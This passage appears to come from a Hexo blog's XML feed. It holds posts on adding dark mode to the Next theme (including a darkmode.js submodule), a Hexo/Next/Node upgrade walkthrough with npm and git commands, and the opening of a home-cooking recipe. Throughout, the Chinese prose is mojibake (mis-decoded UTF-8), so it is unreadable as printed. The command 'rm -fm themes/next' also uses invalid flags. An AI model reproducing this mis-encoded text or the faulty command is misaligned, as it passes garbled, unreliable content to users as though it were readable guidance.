fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1sI0Rhcmttb2Rl">å¤§ä½¬ä»¬çš„æ–‡ç« <i class="fa fa-external-link-alt"></i></span></li><li>ä¼˜ç‚¹ï¼šé…ç½®éå¸¸ç®€å•</li><li>ç¼ºç‚¹ï¼š<ul><li>æ ¹æ®è‡ªå·±çš„æµ‹è¯•ï¼ŒSafariå’ŒFirefox æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯Chromeæ— æ•ˆ</li><li>ä¸èƒ½è¿›è¡Œåˆ‡æ¢ï¼Œè€Œæ˜¯æ ¹æ®ç³»ç»Ÿåå¥½ï¼ˆæ˜¯å¦æ˜¯å¤œé—´æ¨¡å¼ï¼‰æ¥åˆ¤æ–­ æ˜¯å¦å¯ç”¨</li></ul></li></ul><h1 id="æ–¹æ¡ˆ2ï¼šhexo-next-nightmodeæ’ä»¶"><a href="#æ–¹æ¡ˆ2ï¼šhexo-next-nightmodeæ’ä»¶" class="headerlink" title="æ–¹æ¡ˆ2ï¼šhexo-next-nightmodeæ’ä»¶"></a>æ–¹æ¡ˆ2ï¼šhexo-next-nightmodeæ’ä»¶</h1><ul><li>é…ç½®æ–¹æ³•ï¼šè¯·å‚è§<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2Rl">å®˜æ–¹è¯´æ˜<i class="fa fa-external-link-alt"></i></span></li><li>ä¼˜ç‚¹ï¼šå¯ä»¥åˆ‡æ¢ï¼Œé…ç½®ç›¸å¯¹ç®€å•</li><li>ç¼ºç‚¹ï¼š<ul><li>éœ€è¦é¢å¤–å®‰è£…æ’ä»¶</li><li>å¼€å¯åä¼šåœ¨ä¾§è¾¹æ çš„ä¸ªäººä¿¡æ¯ä¸€è§ˆ(Overview)é‡Œæ·»åŠ åˆ‡æ¢é»‘ç™½èƒŒæ™¯çš„æŒ‰é’®ï¼Œä½†æ˜¯ <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2RlL2lzc3Vlcy8xMA==">å½“å‰ç‰ˆæœ¬æ²¡æœ‰é»˜è®¤ä½¿ç”¨æš—è‰²èƒŒæ™¯çš„é€‰é¡¹<i class="fa fa-external-link-alt"></i></span></li><li>é»˜è®¤åˆ‡æ¢æŒ‰é’®åœ¨Overviewé‡Œï¼Œå¯èƒ½ä¼šæœ‰å¦‚ä¸‹å¼Šç«¯<ul><li>å¦‚æœè®¾ç½®ä¸ºé»˜è®¤éšè—ä¾§è¾¹æ ï¼Œåˆ™ç”¨æˆ·é¦–æ¬¡è®¿é—®é¦–é¡µæ—¶ï¼Œä¸çŸ¥é“æœ‰å¤œé—´æ¨¡å¼</li><li>åœ¨æ–‡ç« é¡µé¢æ—¶ï¼Œä¾§è¾¹æ æ˜¯æœ‰ä¸¤ä¸ªæ ‡ç­¾ç»„æˆï¼Œé»˜è®¤æ˜¾ç¤ºæ–‡ç« å¤§çº²ã€‚å› æ­¤åªæœ‰åˆ‡æ¢è‡³Overviewåæ‰èƒ½åç‚¹å‡»èƒŒæ™¯åˆ‡æ¢æŒ‰é’®</li></ul></li><li>bugï¼šdarkmodeä¸‹ï¼Œheaderä½ç½®è¢«é€‰ä¸­çš„categoryèƒŒæ™¯è‰²å˜æˆäº†è“è‰²</li></ul></li></ul><h1 id="æ–¹æ¡ˆ3ï¼šå¼•å…¥jsåº“-darkmode-js"><a href="#æ–¹æ¡ˆ3ï¼šå¼•å…¥jsåº“-darkmode-js" class="headerlink" title="æ–¹æ¡ˆ3ï¼šå¼•å…¥jsåº“ darkmode.js"></a>æ–¹æ¡ˆ3ï¼šå¼•å…¥jsåº“ <code>darkmode.js</code></h1><h2 id="ç¼˜ç”±ï¼ˆéé‡ç‚¹å¯ç•¥è¿‡ï¼‰"><a href="#ç¼˜ç”±ï¼ˆéé‡ç‚¹å¯ç•¥è¿‡ï¼‰" class="headerlink" title="ç¼˜ç”±ï¼ˆéé‡ç‚¹å¯ç•¥è¿‡ï¼‰"></a>ç¼˜ç”±ï¼ˆéé‡ç‚¹å¯ç•¥è¿‡ï¼‰</h2><p>ä»<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">NextåŠ å…¥äº†å¯¹darkmodeçš„åŸç”Ÿæ”¯æŒçš„PRé¡µé¢çš„è®¨è®º<i class="fa fa-external-link-alt"></i></span>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æŸå¤§ä½¬Xå‘Nextå®˜æ–¹è´¡çŒ®äº†åŸç”Ÿdarkmodeçš„ä»£ç åï¼ŒæŸç½‘å‹å‘å…¶å‘¼ååŠ ä¸€æ­¥åŠ ä¸Šåˆ‡æ¢æŒ‰é’®ã€‚</p><p>ä½†å¤§ä½¬Xä¼¼ä¹ä¸æ‰“ç®—åŠ ï¼Œå¹¶è¡¨ç¤ºè¯¥ç½‘å‹å¯ä»¥ä½¿ç”¨jsåº“ <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js<i class="fa fa-external-link-alt"></i></span> å»å®ç°ã€‚</p><p>æ²¡æƒ³åˆ°ç½‘å‹å…¶å®æ˜¯å¤§ä½¬Yï¼Œæœç„¶åœ¨<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">è‡ªå·±çš„åšå®¢<i class="fa fa-external-link-alt"></i></span>æˆåŠŸé›†æˆäº†darkmode.jsã€‚</p><p>äºæ˜¯å¦ä¸€ä½ç½‘å‹å‘å¤§ä½¬Yè¯¢é—®å¦‚ä½•é›†æˆçš„å…·ä½“ç»†èŠ‚ï¼Œä½†æ˜¯æ²¡æœ‰å¾—åˆ°å›åº”ã€‚</p><p>æ—¢ç„¶å¯è¡Œï¼Œé‚£å°±ä¸å¦¨å°è¯•ä¸€ä¸‹ï¼Œæˆ‘ä¹ŸæŒ‰ç…§<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.jså®˜æ–¹çš„è¯´æ˜<i class="fa fa-external-link-alt"></i></span>æ“ä½œä¸€ç•ªï¼Œå…¶ä¸­ä¹Ÿé‡åˆ°äº†äº›å°é—®é¢˜ï¼š</p><ul><li>åˆ‡æ¢æŒ‰é’®æ— æ³•ç‚¹å‡»</li><li>åˆ‡æ¢åˆ°å¤œé—´æ¨¡å¼åï¼Œæ‰€æœ‰å›¾ç‰‡çš„é¢œè‰²ä¹Ÿè¢«ç¿»è½¬ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æ‰€æœŸæœ›çš„</li></ul><p>ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œå‚è€ƒäº†<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpzL2lzc3Vlcy80">å®˜æ–¹ç›¸å…³issue<i class="fa fa-external-link-alt"></i></span>ï¼Œå¹¶ä¸”æŠ„äº†<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">å¤§ä½¬Yçš„ä½œä¸š<i class="fa fa-external-link-alt"></i></span>ã€‚</p><h2 id="ä¸ºNextè®¢åˆ¶darkmode-js"><a href="#ä¸ºNextè®¢åˆ¶darkmode-js" class="headerlink" title="ä¸ºNextè®¢åˆ¶darkmode.js"></a>ä¸ºNextè®¢åˆ¶darkmode.js</h2><p>å¯ä»¥å‚è€ƒè¿™é‡Œæˆ‘forkçš„nextå¯¹æ¯”å…·ä½“åšäº†å“ªäº›é…ç½®å’Œä¿®æ”¹ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hleG8tdGhlbWUtbmV4dA==">dog-2/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p><p>æœ€ç»ˆæ•ˆæœå›¾è§æ–‡ç« æœ€åï¼Œä¸‹é¢æ˜¯å…·ä½“æ­¥éª¤ï¼š</p><h3 id="1-åŠ darkmode-jsæ·»åŠ ä¸ºNextçš„submodule"><a href="#1-åŠ darkmode-jsæ·»åŠ ä¸ºNextçš„submodule" class="headerlink" title="1. åŠ darkmode.jsæ·»åŠ ä¸ºNextçš„submodule"></a>1. åŠ darkmode.jsæ·»åŠ ä¸ºNextçš„submodule</h3><p>.gitignore æœ€åæ·»åŠ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="built_in">source</span>/lib/darkmode-js</span><br></pre></td></tr></table></figure><p>è¿›å…¥ <code>{blog_dir}/themes/next/</code>ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add https://github.com/sandoche/Darkmode.js.git <span class="built_in">source</span>/lib/darkmode-js/</span><br></pre></td></tr></table></figure><h3 id="2-æ ¹æ®åå¥½ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#2-æ ¹æ®åå¥½ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="2. æ ¹æ®åå¥½ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>2. æ ¹æ®åå¥½ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>æ ¹æ®åå¥½ä¿®æ”¹ä¸‹åˆ—é…ç½®æ–‡ä»¶ä¸­çš„å…¶å®ƒé€‰é¡¹</p><ul><li>{blog_dir}/themes/next/languages/en.yml</li><li>nexté…ç½®æ–‡ä»¶ä¸­çš„é…ç½®</li></ul><div class="note warning">            <p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯nextæœ‰ä¸¤ç§é…ç½®æ–‡ä»¶çš„å½¢å¼ï¼Œè¯·ç¡®è®¤è‡ªå·±æ˜¯å“ªä¸€ç§ã€‚<br>æ–°Nextçš„é…ç½®æ–‡ä»¶ï¼Œæœ‰2ç§è®¾ç½®æ–¹å¼ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">å®˜æ–¹ä¸­æ–‡<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">å®˜æ–¹è‹±æ–‡<i class="fa fa-external-link-alt"></i></span></li></ul>          </div><h3 id="3-å®šåˆ¶vendorsåŠ å…¥darkmode-js"><a href="#3-å®šåˆ¶vendorsåŠ å…¥darkmode-js" class="headerlink" title="3. å®šåˆ¶vendorsåŠ å…¥darkmode.js"></a>3. å®šåˆ¶vendorsåŠ å…¥darkmode.js</h3><ol><li>ä¿®æ”¹ <code>{blog_dir}/themes/next/layout/_scripts/vendors.swig</code></li><li>ä¿®æ”¹nexté…ç½®æ–‡ä»¶ä¸­çš„é’ˆå¯¹darkmodeä»¥åŠdarkmode-jsçš„é…ç½®ï¼š<ul><li>ç¡®ä¿nextåŸæœ‰<code>darkmode</code>é€‰é¡¹è®¾ç½®ä¸º <code>false</code></li><li>æ·»åŠ darkmode-jså¼€å…³</li><li>æ·»åŠ darkmode-jsè‡ªå®šä¹‰CDNé€‰é¡¹ï¼ˆå¯é€‰ï¼‰</li></ul></li></ol><h1 id="æœ€ç»ˆæ•ˆæœ"><a href="#æœ€ç»ˆæ•ˆæœ" class="headerlink" title="æœ€ç»ˆæ•ˆæœ"></a>æœ€ç»ˆæ•ˆæœ</h1><img data-src="/tech/hexo-dark-mode-note/1.gif" class="" title="darkmode.jsæ•ˆæœ">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Hexo </tag>
            
            <tag> Hexo Next </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo &amp; Next å‡çº§ç¬”è®°</title>
      <link href="/tech/hexo-next-upgrade-note/"/>
      <url>/tech/hexo-next-upgrade-note/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Hexo &amp; Next Upgrade Note</strong></em></li><li>Author: dog2</li></ul><hr><p>å‡ å¹´æ²¡æœ‰ç¢°Blogï¼Œæœ€è¿‘æ‰“ç®—é‡æ–°å¼€å§‹å†™ï¼Œå› æ­¤éœ€è¦æ›´æ–°hexoä»¥åŠNextä¸»é¢˜ã€‚</p><p>ç”±äºä¸æ€ä¹ˆæ‡‚å‰ç«¯ï¼Œä¸å‡ºæ„å¤–æ„å¤–åœ°é‡åˆ°äº†ä¸€å †å‘ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼š</p><h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><ul><li>node: <code>v6.17.1</code>  =&gt; <code>v13.7.0</code></li><li>hexo: <code>v3.2.x</code> =&gt; <code>v4.2.0</code></li><li>next: <code>v4.x</code> =&gt; <code>v7.8.0</code></li></ul><h2 id="æ›´æ–°-node"><a href="#æ›´æ–°-node" class="headerlink" title="æ›´æ–° node"></a>æ›´æ–° node</h2><p> æˆ‘çš„ç³»ç»Ÿä½¿ç”¨nvmç®¡ç†å¤šç‰ˆæœ¬nodeï¼Œé¦–å…ˆæ›´æ–°npmï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure><p>æ¸…é™¤npmç¼“å­˜ï¼Œå¯èƒ½éœ€è¦ sudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="æ›´æ–°-hexo"><a href="#æ›´æ–°-hexo" class="headerlink" title="æ›´æ–° hexo"></a>æ›´æ–° hexo</h2><p>è¿›å…¥blogç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><ul><li>æ›´æ–°package.jsonä¸­çš„hexoåŠä¸ªæ’ä»¶ç‰ˆæœ¬  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm-check</span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br></pre></td></tr></table></figure></li><li>æ›´æ–°hexoåŠæ‰€æœ‰æ’ä»¶  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure></li><li>ç¡®è®¤hexoç‰ˆæœ¬å·æ˜¯å¦å·²æ›´æ–°  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure></li></ul><div class="note warning">            <h3 id="æ½œåœ¨é”™è¯¯"><a href="#æ½œåœ¨é”™è¯¯" class="headerlink" title="æ½œåœ¨é”™è¯¯"></a>æ½œåœ¨é”™è¯¯</h3><p>æ­¤æ—¶è¿è¡Œ hexo generate å‘½ä»¤ï¼Œè‹¥å‡ºç°äº†å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">DTraceProviderBindings MODULE_NOT_FOUND;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>é€šè¿‡é‡æ–°å®‰è£… `hexo-cli` å¯ä»¥è§£å†³<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-cli -g</span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>          </div><h2 id="æ›´æ–°-Next-ä¸»é¢˜"><a href="#æ›´æ–°-Next-ä¸»é¢˜" class="headerlink" title="æ›´æ–° Next ä¸»é¢˜"></a>æ›´æ–° Next ä¸»é¢˜</h2><h3 id="å¤‡ä»½ï¼ˆå¯é€‰ï¼‰"><a href="#å¤‡ä»½ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="å¤‡ä»½ï¼ˆå¯é€‰ï¼‰"></a>å¤‡ä»½ï¼ˆå¯é€‰ï¼‰</h3><p>æˆ‘å¤‡ä»½äº†å¦‚ä¸‹æ—§é…ç½®æ–‡ä»¶ï¼š</p><ul><li><code>{blog_dir}/themes/next/_config.yml</code></li><li><code>{blog_dir}/themes/next/languages/en.yml</code></li><li><code>{blog_dir}/themes/next/languages/zh-Hans.yml</code></li><li><code>{blog_dir}/themes/next/source/404.yml</code></li></ul><p>åæ¥å‘ç°æ–°ç‰ˆNextå˜åŒ–å¤ªå¤§ï¼Œå¾ˆå¤šé…ç½®é¡¹å’Œæ–¹å¼éƒ½å˜äº†ã€‚<br>ä½†æ˜¯æ—§æ–‡ä»¶å¯ä»¥ä½œä¸ºè¿‡å»å–œå¥½çš„å‚è€ƒã€‚</p><h3 id="æ›´æ–°-Next"><a href="#æ›´æ–°-Next" class="headerlink" title="æ›´æ–° Next"></a>æ›´æ–° Next</h3><p>æƒ³è¦æ›´æ–°Nextæ—¶ï¼Œå‘ç°å·²ç»æœ‰äº†å¤©ç¿»åœ°è¦†çš„å˜åŒ–ï¼Œè¿githubçš„é¡¹ç›®ç›®å½•éƒ½å˜äº†ï¼Œè¯¥é¡¹ç›®å·²ç»ç¤¾åŒºåŒ–ï¼š</p><ul><li>æ—§ç›®å½• <code>~ v5.x</code>ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lpc3NuYW4vaGV4by10aGVtZS1uZXh0">https://github.com/iissnan/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li><li>æ–°ç›®å½• <code>v6.x ~</code>ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0">https://github.com/theme-next/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li></ul><ul><li>åˆ é™¤æ—§çš„ next  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -fm themes/next</span><br></pre></td></tr></table></figure></li><li>å…‹éš†æœ€æ–°çš„ next  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></li></ul><h3 id="é…ç½®-Next"><a href="#é…ç½®-Next" class="headerlink" title="é…ç½® Next"></a>é…ç½® Next</h3><p>ä»å®˜æ–¹æ–‡æ¡£è·æ‚‰ï¼ŒNextçš„é…ç½®å˜äº†å¾ˆå¤šã€‚</p><p>å…¶å®é¦–å…ˆè¯¥æ’ä¸€å¥ï¼Œå®˜ç½‘ä¹Ÿå˜äº†ã€‚ã€‚ã€‚</p><ul><li>æ—§å®˜ç½‘ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ub3Rlcy5paXNzbmFuLmNvbS8=">https://notes.iissnan.com/<i class="fa fa-external-link-alt"></i></span></li><li>æ–°å®˜ç½‘ï¼š<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy8=">https://theme-next.org/<i class="fa fa-external-link-alt"></i></span></li></ul><p>æ–°Nextçš„é…ç½®æ–‡ä»¶ï¼Œæœ‰2ç§è®¾ç½®æ–¹å¼ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">å®˜æ–¹ä¸­æ–‡<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">å®˜æ–¹è‹±æ–‡<i class="fa fa-external-link-alt"></i></span></li></ul><p>æ¯ä¸ªäººçš„é…ç½®ä¸å°½ç›¸åŒï¼Œæˆ‘åªæ˜¯ç®€å•çš„é…ç½®äº†ä¸€éƒ¨åˆ†ï¼Œè¿™é‡Œç»™å‡ºå¤§ä½¬ä»¬çš„éå¸¸å…¨é¢çš„é…ç½®ä»¥ä¾›å‚è€ƒ</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly90ZGluZy50b3AvYXJjaGl2ZXMvNDJjMzhiMTAuaHRtbA==">Hexo-NexT (v7.0+) ä¸»é¢˜é…ç½®<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU0JUI4JUJCJUU5JUEyJTk4JUU3JUJFJThFJUU1JThDJTk2Lmh0bWw=">Nextä¸»é¢˜ç¾åŒ–(ä»…7.1ç‰ˆæœ¬)<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="å®šåˆ¶-Next"><a href="#å®šåˆ¶-Next" class="headerlink" title="å®šåˆ¶ Next"></a>å®šåˆ¶ Next</h3><h4 id="Dark-Mode-æš—è‰²èƒŒæ™¯ï¼ˆå¤œé—´æ¨¡å¼ï¼‰"><a href="#Dark-Mode-æš—è‰²èƒŒæ™¯ï¼ˆå¤œé—´æ¨¡å¼ï¼‰" class="headerlink" title="Dark Mode æš—è‰²èƒŒæ™¯ï¼ˆå¤œé—´æ¨¡å¼ï¼‰"></a>Dark Mode æš—è‰²èƒŒæ™¯ï¼ˆå¤œé—´æ¨¡å¼ï¼‰</h4><p>è¿™éƒ¨åˆ†å†…å®¹è¾ƒå¤šï¼Œæˆ‘å•ç‹¬å†™åˆ°äº†å¦ä¸€ç¯‡æ–‡ç« é‡Œ <a href="/tech/hexo-dark-mode-note/">Hexoï¼ˆNextä¸»é¢˜ï¼‰Dark Mode(æš—è‰²èƒŒæ™¯/å¤œé—´æ¨¡å¼)æŠ˜è…¾ç¬”è®°</a></p><h4 id="ä»£ç å—Mac-Panelç‰¹æ•ˆ"><a href="#ä»£ç å—Mac-Panelç‰¹æ•ˆ" class="headerlink" title="ä»£ç å—Mac Panelç‰¹æ•ˆ"></a>ä»£ç å—Mac Panelç‰¹æ•ˆ</h4><p>è¿™ä¸ªå±äºç¾åŒ–ï¼Œæˆ‘æ²¡æœ‰å°è¯•ï¼Œè¯·å‚è§<span class="exturl" data-url="aHR0cHM6Ly9oYXNhaWsuY29tL3Bvc3RzL2Q3Mzk5ZTgwLmh0bWw=">å¤§ä½¬çš„è®¢åˆ¶<i class="fa fa-external-link-alt"></i></span>ã€‚</p><h3 id="é—ç•™é—®é¢˜"><a href="#é—ç•™é—®é¢˜" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h3><ol><li>å½“å‰ç‰ˆæœ¬çš„Next ç›¸å…³æ–‡ç« ï¼ˆ<code>hexo-related-popular-posts</code>æ’ä»¶ï¼‰<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlYTMvaGV4by1yZWxhdGVkLXBvcHVsYXItcG9zdHMvaXNzdWVzLzIx">æ— æ³•ä½¿ç”¨<i class="fa fa-external-link-alt"></i></span>ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘çš„å§¿åŠ¿ä¸å¯¹</li></ol><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRlY2guc2l0ZS96aC1DTi8zYmEzYmU5Lw==">Hexoç‰ˆæœ¬å‡çº§æŒ‡å—<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vZW50cnkvNWI5NjUxOTVlNTFkNDUwZTU1MTlkMmM0">Hexoçš„DTraceProviderBindings MODULE_NOT_FOUNDé—®é¢˜<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZXZlbmNoby5naXRodWIuaW8vYXJjaGl2ZXMvMTQ1MzRiZWIuaHRtbA==">Hexoåšå®¢NexTä¸»é¢˜ä»v5.x.xæ›´æ–°åˆ°v6.x.xçš„è®°å½•åŠæ€»ç»“<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1s">Nextå‡çº§+Macè¿ç§»<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Hexo Next </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒå¨ç¬”è®° #2: æ…¢ç‚’ä¸‰ä¸ã€Œèœè°±ã€</title>
      <link href="/life/dog2s-cooking-notes-2/"/>
      <url>/life/dog2s-cooking-notes-2/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Dog2â€™s Cooking Notes #2: Slowly Fried DingDingDing(Cookbook)</strong></em></li><li>Author: dog2</li></ul><hr><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬èœè°±æ˜¯æ ¹æ®<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9y">ã€Œä¸‹å¨æˆ¿ã€<i class="fa fa-external-link-alt"></i></span>èœè°±<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9yZWNpcGUvMTAwMjg3NTY2Lw==">ã€Œæ¯›è±†è‚‰ä¸ç‚’èŒ„å­ã€<i class="fa fa-external-link-alt"></i></span> æ”¹è¿›è€Œæ¥ã€‚</p><p>æ”¹è¿›åçš„èœè°±åœ¨é£Ÿæä¸­å»æ‰äº†èŒ„ä¸ï¼Œç”¨èƒ¡èåœä¸æ›¿æ¢ï¼Œå› èŒ„ä¸æŒ‰ç…§åŸèœè°±çš„å¤„ç†æ–¹å¼ä»æ¯”è¾ƒå¸ç›ï¼Œä¸”åŸèœè°±ä¸­å¤„ç†èŒ„ä¸ä¸åƒçƒ¹åˆ¶è‚‰æœ«èŒ„å­é‚£æ ·ä¼šä½¿ç”¨è¿‡é‡æ²¹ç…é€ï¼Œè¿™ä¼šå¯¼è‡´æœ€ç»ˆçƒ¹åˆ¶çš„èŒ„ä¸å¸¦æœ‰äº›è®¸ç”ŸèŒ„ç‰¹æœ‰çš„è…¥å‘³ã€‚</p><p>åç»­ä½æ–™ä»¥åŠçƒ¹åˆ¶æ–¹æ³•ä¹Ÿæœ‰è¾ƒå¤§æ”¹åŠ¨ï¼Œå…·ä½“è§æ–°èœè°±ã€‚</p><a id="more"></a><h2 id="è…Œåˆ¶ç˜¦è‚‰-ä¸-ä¸-æœ«"><a href="#è…Œåˆ¶ç˜¦è‚‰-ä¸-ä¸-æœ«" class="headerlink" title="è…Œåˆ¶ç˜¦è‚‰(ä¸/ä¸/æœ«)"></a>è…Œåˆ¶ç˜¦è‚‰(ä¸/ä¸/æœ«)</h2><p>åœ¨ä»‹ç»æ­£å¼èœè°±ä¹‹å‰ï¼Œæœ¬èŠ‚å…ˆä»‹ç»ä¸€ä¸‹é€šç”¨çš„ç˜¦è‚‰è…Œåˆ¶æ–¹æ³•ã€‚</p><p>ä¸å°‘ç»å…¸èœè°±éƒ½éœ€è¦ä½¿ç”¨ç˜¦è‚‰ï¼Œæ¯”å¦‚é’æ¤’è‚‰ä¸ã€è‚‰æœ«èŒ„å­ç­‰ï¼Œåœ¨ç‚’åˆ¶å‰å¯¹ç˜¦è‚‰è¿›è¡Œè…Œåˆ¶æ˜¯ä¸€é“å¿…ä¸å¯å°‘çš„å·¥åºï¼Œè…Œåˆ¶å…¶å®å°±æ˜¯åŠ å…¥ä½æ–™æ‹ŒåŒ€é™ç½®ç‰‡åˆ»çš„ç®€å•è¿‡ç¨‹ï¼Œä½†ä¸åŒèœè°±ä¸­çš„è…Œåˆ¶ä½æ–™ä¸å°½ç›¸åŒã€‚å› æ­¤è¿™é‡Œä»‹ç»ä¸€ä¸‹ä¸ªäººè®¤ä¸ºå‘³é“è¾ƒå¥½çš„è…Œåˆ¶æ–¹å¼ã€‚</p><p>è¯¥æ–¹æ³•æ­£æ˜¯ä»ä¸ŠèŠ‚ä¸­çš„åŸèœè°±ä¸­ä¹ 